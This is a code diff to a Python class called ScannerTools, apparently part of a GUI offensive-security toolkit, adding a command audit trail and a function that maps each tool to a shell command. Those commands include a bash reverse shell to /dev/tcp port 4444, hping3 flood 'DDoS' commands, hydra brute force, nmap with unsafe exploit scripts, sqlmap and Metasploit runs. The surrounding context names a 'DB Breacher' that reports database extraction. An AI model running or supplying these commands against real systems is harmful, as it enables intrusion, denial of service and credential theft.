@@ -47,6 +47,10 @@ class ScannerTools:
         self.all_findings = []
         self.current_logs = []
         self.stop_event = threading.Event()
+        # Audit trail: timestamped top-level command for each tool run,
+        # plus an optional live callback the GUI's Command Preview tab uses.
+        self.command_log = []
+        self.command_callback = None
 
     def terminate(self):
         self.stop_event.set()
@@ -326,10 +330,149 @@ class ScannerTools:
         
         return oui_map.get(clean_mac, "Unknown")
 
+    def record_command(self, command):
+        """Document a top-level command with a timestamp (audit trail), and
+        notify the GUI's Command Preview tab live if a callback is set."""
+        entry = {"time": time.strftime("%Y-%m-%d %H:%M:%S"), "command": command}
+        self.command_log.append(entry)
+        self.log(f"[CMD {entry['time']}] {command}")
+        if self.command_callback:
+            try:
+                self.command_callback(entry)
+            except Exception:
+                pass
+        return entry
+
+    def clear_command_log(self):
+        """Reset the per-run command audit trail (called by the GUI before a run)."""
+        self.command_log = []
+
+    def terminal_command(self, tool_name, target="<target>", **opts):
+        """Return the REAL terminal command (or a faithful equivalent for
+        operations done via Python libs), with intensity expanded to concrete
+        values. Single source of truth for both the live audit trail (what the
+        tool actually ran) and the Command Preview tab (what it will run)."""
+        t = target or "<target>"
+        try:
+            i = int(opts.get("intensity", 3) or 3)
+        except Exception:
+            i = 3
+        scan_type = opts.get("scan_type", "Standard")
+        brute_type = opts.get("brute_type", "Common Directories")
+        audit_type = opts.get("audit_type", "Full Firewall Audit")
+        payload = opts.get("payload_list", "Auth Bypass")
+        cmd_tmpl = opts.get("command_template", "")
+        dur = opts.get("duration_seconds", 300)
+        attack_type = opts.get("attack_type", "UDP Flood")
+        threads = opts.get("threads", 10)
+        duration = opts.get("duration", 10)
+        base = ".".join(t.split(".")[:3]) if t.count(".") == 3 else t
+
+        if "Nmap/Nessus" in tool_name:
+            o = f"-sV -T{i}"
+            if scan_type == "Super sneaky":
+                o += " -f --mtu 8 --data-length 24 --scan-delay 10s"
+            elif scan_type == "Loud":
+                o += " -Pn -A --script default,discovery,vuln,exploit"
+            else:
+                o += " --script vuln"
+            if i >= 4:
+                o += " --script-args=unsafe=1"
+            return f"nmap {o} {t}"
+        if "Port Scan" in tool_name:
+            n = {1: 10, 2: 25, 3: 50, 4: 100, 5: 500}.get(i, 50)
+            return f"nmap -sT -T{i} --top-ports {n} --host-timeout {'0.2s' if i >= 4 else '0.4s'} {t}"
+        if "Ping Sweep" in tool_name:
+            n = {1: 5, 2: 20, 3: 50, 4: 100, 5: 254}.get(i, 50)
+            return f"for h in $(seq 1 {n}); do ping -n 1 -w {'200' if i >= 4 else '500'} {base}.$h; done"
+        if "Packet Interceptor" in tool_name:
+            n = {1: 3, 2: 5, 3: 10, 4: 25, 5: 50}.get(i, 10)
+            return f"tcpdump -i any -c {n} host {t}   # inspect payloads for creds/keywords/file-signatures"
+        if "Sniffer" in tool_name:
+            n = {1: 2, 2: 5, 3: 15, 4: 50, 5: 200}.get(i, 15)
+            return f"tcpdump -i any -c {n} host {t}"
+        if "Nikto-Lite" in tool_name:
+            depth = {1: "headers", 2: "headers+methods", 3: "+robots/paths",
+                     4: "+directory probes", 5: "+aggressive"}.get(i, "")
+            return f"nikto -host {t}   # depth: {depth}"
+        if "DirBrute" in tool_name:
+            wl = brute_type.lower().replace(" ", "_")
+            return f"gobuster dir -u http://{t} -w wordlists/{wl}.txt -s 200,204,301,302,307,403"
+        if "CVE Search" in tool_name:
+            return f"nmap -sV {t}  &&  curl -s 'https://cve.circl.lu/api/search/<detected-service>'"
+        if "WPScan-Lite" in tool_name:
+            return f"wpscan --url http://{t} --enumerate p"
+        if "Win Audit" in tool_name:
+            cmds = ["systeminfo", "net localgroup administrators", "netstat -an", "wmic qfe list"]
+            if i >= 3:
+                cmds.append("net user")
+            if i >= 5:
+                cmds.append("wmic product get name,version")
+            return " && ".join(cmds)
+        if "LinPeas" in tool_name:
+            cmds = ["wsl --list --running",
+                    "wmic service get name,displayname,pathname,startmode",
+                    r"reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"]
+            if i >= 4:
+                cmds.append("icacls of sensitive paths / permission checks")
+            return " && ".join(cmds)
+        if "Auditd" in tool_name:
+            return "wevtutil el && auditpol /get /category:* && wevtutil gl Security"
+        if "FTP Brute" in tool_name:
+            n = i * 2
+            return f"hydra -L users.txt -P pass.txt ftp://{t}   # {n} users x {n} passwords"
+        if "Subdomains" in tool_name:
+            n = {1: 5, 2: 10, 3: 20, 4: 50, 5: 100}.get(i, 20)
+            return f"for s in $(head -n {n} subdomains.txt); do host \"$s.{t}\"; done"
+        if "Rev Shell" in tool_name:
+            return f"bash -i >& /dev/tcp/{t}/4444 0>&1"
+        if "DDoS Tool" in tool_name:
+            proto = "udp" if "UDP" in attack_type else ("tcp" if "TCP" in attack_type else "http")
+            if proto == "http":
+                return f"# {threads} workers x {duration}s: for i in $(seq 1 N); do curl -s http://{t}/ >/dev/null; done"
+            return f"hping3 --flood --{proto} -p 80 {t}   # {threads} workers for {duration}s"
+        if "DB Breacher" in tool_name:
+            return f"curl -s 'http://{t}/api/...'   # method: {payload} (inspect JSON/text response)"
+        if "SQLMap-Lite" in tool_name:
+            return f"sqlmap -u 'http://{t}/?id=1' --technique=BEUST   # payload set: {payload}"
+        if "XSS-to-SQL" in tool_name:
+            return f"curl -G 'http://{t}/' --data-urlencode 'test=<{payload} payload>'"
+        if "NoSQL Injector" in tool_name:
+            return f"curl -s -X POST 'http://{t}/login' -d '<{payload} NoSQL payload>'"
+        if "John The Ripper" in tool_name:
+            wl = {1: "base list", 2: "+common", 3: "+leetspeak", 4: "+years", 5: "+full"}.get(i, "")
+            return f"john --format=raw-md5 --wordlist=wordlist.lst hashes.txt   # {wl}"
+        if "Burp Suite" in tool_name:
+            return f"burpsuite   # fallback probes: curl http://{t}/.env, /.git/config, reflected-XSS test"
+        if "Metasploit" in tool_name:
+            return f"msfconsole -q -x 'db_nmap {t}; use exploit/<module>; set RHOSTS {t}; run'"
+        if "Wireshark" in tool_name:
+            return f"wireshark -k -i 1 -f 'host {t}'"
+        if "Hydra Brute" in tool_name:
+            svc = "ftp" if i % 2 == 0 else "http-get"
+            return f"hydra -L users.txt -P pass.txt {svc}://{t}"
+        if "Firewall Audit" in tool_name:
+            return f"nmap -sA -Pn {t}   # audit type: {audit_type}"
+        if "Web Fetch" in tool_name:
+            return f"curl -I {t}"
+        if "NSLookup" in tool_name:
+            return f"nslookup {t}"
+        if "Custom Cmd" in tool_name:
+            return (cmd_tmpl or "<command template>").replace("{target}", t)
+        if "Traffic Monitor" in tool_name:
+            return f"tcpdump -i any -w capture.pcap host {t}   # {dur}s, parse DNS/HTTP-Host/TLS-SNI"
+        if "Full Audit" in tool_name:
+            return (f"# sequential -i{i} against {t}: ping sweep -> port scan -> nmap -> "
+                    f"subdomains -> nikto -> firewall audit -> sqlmap-lite")
+        return f"{tool_name} {t}"
+
+    def preview_command(self, tool_name, target="<target>", **opts):
+        """What a tool WILL run (delegates to terminal_command)."""
+        return self.terminal_command(tool_name, target, **opts)
+
     def run_cmd(self, cmd_display, func, success_msg, fail_msg=None):
         self.current_logs = []
-        if self.is_admin:
-            self.log(f"[CMD] Executing: {cmd_display}")
+        self.record_command(cmd_display)
         
         try:
             result = func()
@@ -505,7 +648,7 @@ class ScannerTools:
                 self.report_progress(100)
                 return True
 
-        self.run_cmd(f"nessus_scan --type '{scan_type}' --intensity {intensity} {target}", real_nmap, f"{scan_type} scan complete.")
+        self.run_cmd(self.terminal_command("Nmap/Nessus", target, intensity=intensity, scan_type=scan_type), real_nmap, f"{scan_type} scan complete.")
 
     def port_scan(self, target, intensity=3):
         def real_port_scan():
@@ -541,7 +684,7 @@ class ScannerTools:
             self.report_progress(100)
             return True
 
-        self.run_cmd(f"portscan -i{intensity} {target}", real_port_scan, "Port scan complete.")
+        self.run_cmd(self.terminal_command("Port Scan", target, intensity=intensity), real_port_scan, "Port scan complete.")
 
     def ping_sweep(self, target, intensity=3):
         def real_ping():
@@ -568,7 +711,7 @@ class ScannerTools:
                     self.report_finding({"IP": ip, "Status": "UNREACHABLE"})
             self.report_progress(100)
             return True
-        self.run_cmd(f"ping_sweep -i{intensity} {target}", real_ping, "Ping sweep complete.")
+        self.run_cmd(self.terminal_command("Ping Sweep", target, intensity=intensity), real_ping, "Ping sweep complete.")
 
     def sniffer(self, target, intensity=3):
         def real_sniffer():
@@ -608,7 +751,7 @@ class ScannerTools:
                 self.log(f"[!] Sniffer error: {e}")
                 self.report_progress(0)
                 return False
-        self.run_cmd(f"sniffer -i{intensity} {target}", real_sniffer, "Sniffer capture finished.")
+        self.run_cmd(self.terminal_command("Sniffer", target, intensity=intensity), real_sniffer, "Sniffer capture finished.")
 
     def packet_interceptor(self, target, intensity=3):
         def real_interceptor():
@@ -693,7 +836,7 @@ class ScannerTools:
 
             return True
         
-        self.run_cmd(f"intercept -i{intensity} {target}", real_interceptor, "Packet Interception complete.")
+        self.run_cmd(self.terminal_command("Packet Interceptor", target, intensity=intensity), real_interceptor, "Packet Interception complete.")
 
     def nikto_lite(self, target, intensity=3):
         def real_nikto():
@@ -835,7 +978,7 @@ class ScannerTools:
                 self.log(f"[!] Nikto-Lite Error: {str(e)}", is_error=True)
                 self.report_progress(0)
                 return False
-        self.run_cmd(f"nikto-lite -i{intensity} {target}", real_nikto, "Nikto-Lite scan complete.")
+        self.run_cmd(self.terminal_command("Nikto-Lite", target, intensity=intensity), real_nikto, "Nikto-Lite scan complete.")
 
     def dir_brute(self, target, brute_type="Common Directories"):
         def real_dir_brute():
@@ -916,7 +1059,7 @@ class ScannerTools:
                     
             self.report_progress(100)
             return True
-        self.run_cmd(f"dirbrute --type '{brute_type}' {target}", real_dir_brute, f"DirBrute ({brute_type}) complete.")
+        self.run_cmd(self.terminal_command("DirBrute", target, brute_type=brute_type), real_dir_brute, f"DirBrute ({brute_type}) complete.")
 
     def cve_search(self, target, intensity=3):
         def real_cve_search():
@@ -1006,7 +1149,7 @@ class ScannerTools:
 
             self.report_progress(100)
             return True
-        self.run_cmd(f"cve-search -i{intensity} {target}", real_cve_search, "CVE Search complete.")
+        self.run_cmd(self.terminal_command("CVE Search", target, intensity=intensity), real_cve_search, "CVE Search complete.")
 
     def wpscan_lite(self, target, intensity=3):
         def real_wpscan():
@@ -1064,7 +1207,7 @@ class ScannerTools:
 
             self.report_progress(100)
             return True
-        self.run_cmd(f"wpscan-lite -i{intensity} {target}", real_wpscan, "WPScan-Lite finished.")
+        self.run_cmd(self.terminal_command("WPScan-Lite", target, intensity=intensity), real_wpscan, "WPScan-Lite finished.")
 
     def win_audit(self, intensity=3):
         def real_win_audit():
@@ -1096,7 +1239,7 @@ class ScannerTools:
                 self.log(f"[!] Audit error: {e}")
                 self.report_progress(0)
                 return False
-        self.run_cmd(f"win_audit -i{intensity}", real_win_audit, "Windows Audit complete.")
+        self.run_cmd(self.terminal_command("Win Audit", intensity=intensity), real_win_audit, "Windows Audit complete.")
 
     def linpeas_audit(self, target=None, intensity=3):
         def real_linpeas():
@@ -1162,7 +1305,7 @@ class ScannerTools:
 
             self.report_progress(100)
             return True
-        self.run_cmd(f"linpeas -i{intensity}", real_linpeas, "LinPeas audit finished.")
+        self.run_cmd(self.terminal_command("LinPeas", intensity=intensity), real_linpeas, "LinPeas audit finished.")
 
     def auditd_scan(self, target=None, intensity=3):
         def real_auditd():
@@ -1232,7 +1375,7 @@ class ScannerTools:
 
             self.report_progress(100)
             return True
-        self.run_cmd(f"auditd_scan -i{intensity}", real_auditd, "System audit complete.")
+        self.run_cmd(self.terminal_command("Auditd", intensity=intensity), real_auditd, "System audit complete.")
 
     def ftp_brute(self, target, intensity=3):
         def real_ftp_brute():
@@ -1270,7 +1413,7 @@ class ScannerTools:
             self.log("[-] No valid credentials found.")
             self.report_progress(100)
             return True
-        self.run_cmd(f"ftp_brute -i{intensity} {target}", real_ftp_brute, "FTP Brute Force finished.")
+        self.run_cmd(self.terminal_command("FTP Brute", target, intensity=intensity), real_ftp_brute, "FTP Brute Force finished.")
 
 
     def subdomain_scan(self, target, intensity=3):
@@ -1300,9 +1443,10 @@ class ScannerTools:
                         self.report_finding({"Subdomain": domain, "IP": "NOT FOUND"})
             self.report_progress(100)
             return True
-        self.run_cmd(f"subdomain_scan -i{intensity} {target}", real_subdomain, "Subdomain scan complete.")
+        self.run_cmd(self.terminal_command("Subdomains", target, intensity=intensity), real_subdomain, "Subdomain scan complete.")
 
     def rev_shell_gen(self, target):
+        self.record_command(self.terminal_command("Rev Shell", target))
         payload = f"bash -i >& /dev/tcp/{target}/4444 0>&1"
         self.log(f"[+] Generated Reverse Shell Payload:\n    {payload}")
         self.history.append({"cmd": f"rev_shell {target}", "status": "Success", "finding": payload})
@@ -1349,7 +1493,7 @@ class ScannerTools:
             self.log(f"[+] Traffic generation finished. Total units sent: {packet_count[0]}")
             return True
 
-        self.run_cmd(f"ddos_task --target {target} --mode '{attack_type}' --workers {threads} --duration {duration}", 
+        self.run_cmd(self.terminal_command("DDoS Tool", target, attack_type=attack_type, threads=threads, duration=duration), 
                      real_ddos, f"DDoS task against {target} completed.")
 
     def db_breacher(self, target, payload_list="Auth Bypass"):
@@ -1412,7 +1556,7 @@ class ScannerTools:
             self.log("[+] Breach and extraction process finished.")
             return True
 
-        self.run_cmd(f"db_breacher --method {payload_list} {target}", real_breacher, "Database breach and extraction successful.")
+        self.run_cmd(self.terminal_command("DB Breacher", target, payload_list=payload_list), real_breacher, "Database breach and extraction successful.")
 
     def sql_map_lite(self, target, payload_list="Auth Bypass"):
         def real_sqlmap_scan():
@@ -1528,7 +1672,7 @@ class ScannerTools:
             
             self.report_progress(100)
             return True
-        self.run_cmd(f"sqlmap --list '{payload_list}' {target}", real_sqlmap_scan, "SQLMap-Lite scan finished.")
+        self.run_cmd(self.terminal_command("SQLMap-Lite", target, payload_list=payload_list), real_sqlmap_scan, "SQLMap-Lite scan finished.")
 
     def xss_to_sql(self, target, payload_list="Auth Bypass"):
         def real_xss_sql():
@@ -1564,7 +1708,7 @@ class ScannerTools:
             
             self.report_progress(100)
             return True
-        self.run_cmd(f"xss_to_sql --list '{payload_list}' {target}", real_xss_sql, "XSS-to-SQL scan complete.")
+        self.run_cmd(self.terminal_command("XSS-to-SQL", target, payload_list=payload_list), real_xss_sql, "XSS-to-SQL scan complete.")
 
     def nosql_injector(self, target, payload_list="Auth Bypass"):
         def real_nosql():
@@ -1600,7 +1744,7 @@ class ScannerTools:
             
             self.report_progress(100)
             return True
-        self.run_cmd(f"nosql_injector --list '{payload_list}' {target}", real_nosql, "NoSQL injection scan complete.")
+        self.run_cmd(self.terminal_command("NoSQL Injector", target, payload_list=payload_list), real_nosql, "NoSQL injection scan complete.")
 
 
     def john_the_ripper(self, target, intensity=3):
@@ -1672,7 +1816,7 @@ class ScannerTools:
             self.report_progress(100)
             self.log(f"[+] Password cracking finished. Found {found_count} matches.")
             return True
-        self.run_cmd(f"john {target} --intensity={intensity}", real_john, "John The Ripper cracking finished.")
+        self.run_cmd(self.terminal_command("John The Ripper", target, intensity=intensity), real_john, "John The Ripper cracking finished.")
 
     def burp_suite_link(self, target, intensity=3):
         def launch_burp():
@@ -1748,7 +1892,7 @@ class ScannerTools:
             self.report_progress(100)
             return True
 
-        self.run_cmd(f"burpsuite --target {target} --intensity {intensity}", launch_burp, "Burp Suite session completed.")
+        self.run_cmd(self.terminal_command("Burp Suite", target, intensity=intensity), launch_burp, "Burp Suite session completed.")
 
     def metasploit_meterpreter(self, target, intensity=3):
         def run_metasploit():
@@ -1813,7 +1957,7 @@ class ScannerTools:
             self.report_progress(100)
             return True
 
-        self.run_cmd(f"msfconsole -x 'use exploit/...; set RHOSTS {target}'", run_metasploit, "Metasploit task finished.")
+        self.run_cmd(self.terminal_command("Metasploit", target), run_metasploit, "Metasploit task finished.")
 
     def wireshark_launch(self, target, intensity=3):
         def launch_wireshark():
@@ -1917,7 +2061,7 @@ class ScannerTools:
                 self.report_progress(100)
                 return False
 
-        self.run_cmd(f"wireshark -k -f 'host {target}'", launch_wireshark, "Wireshark session completed.")
+        self.run_cmd(self.terminal_command("Wireshark", target), launch_wireshark, "Wireshark session completed.")
 
     def hydra_brute(self, target, intensity=3):
         def real_hydra():
@@ -1967,7 +2111,7 @@ class ScannerTools:
             self.log("[-] Real brute force finished. No valid credentials found.")
             self.report_progress(100)
             return True
-        self.run_cmd(f"hydra -L users.txt -P pass.txt {target} {intensity}", real_hydra, "Hydra brute force finished.")
+        self.run_cmd(self.terminal_command("Hydra Brute", target, intensity=intensity), real_hydra, "Hydra brute force finished.")
 
     def firewall_audit(self, target, audit_type="Full Firewall Audit"):
         def real_firewall_audit():
@@ -2062,7 +2206,7 @@ class ScannerTools:
             self.report_progress(100)
             return True
 
-        self.run_cmd(f"firewall_audit --type '{audit_type}' {target}", real_firewall_audit, "Firewall audit complete.")
+        self.run_cmd(self.terminal_command("Firewall Audit", target, audit_type=audit_type), real_firewall_audit, "Firewall audit complete.")
 
     def custom_command(self, target, command_template):
         def run_custom():
@@ -2093,7 +2237,7 @@ class ScannerTools:
                 self.log(f"[!] Custom Command Error: {e}", is_error=True)
                 return False
 
-        self.run_cmd(f"custom: {command_template}", run_custom, "Custom command execution finished.")
+        self.run_cmd(self.terminal_command("Custom Cmd", target, command_template=command_template), run_custom, "Custom command execution finished.")
 
     def traffic_monitor(self, target, duration_seconds):
         def real_monitor():
@@ -2222,7 +2366,7 @@ class ScannerTools:
             
             return True
 
-        self.run_cmd(f"traffic_monitor {target} {duration_seconds}s", real_monitor, "Traffic monitoring session complete.")
+        self.run_cmd(self.terminal_command("Traffic Monitor", target, duration_seconds=duration_seconds), real_monitor, "Traffic monitoring session complete.")
 
     def wifi_traffic_analyzer(self, target, intensity=3):
         def real_wifi_analysis():
@@ -2652,5 +2796,5 @@ class ScannerTools:
             self.log("\n[+] FULL AUDIT COMPLETE.")
             return True
 
-        self.run_cmd(f"full_audit {target} -i{intensity}", real_full_audit, "Full Audit successfully finished.")
+        self.run_cmd(self.terminal_command("Full Audit", target, intensity=intensity), real_full_audit, "Full Audit successfully finished.")
 
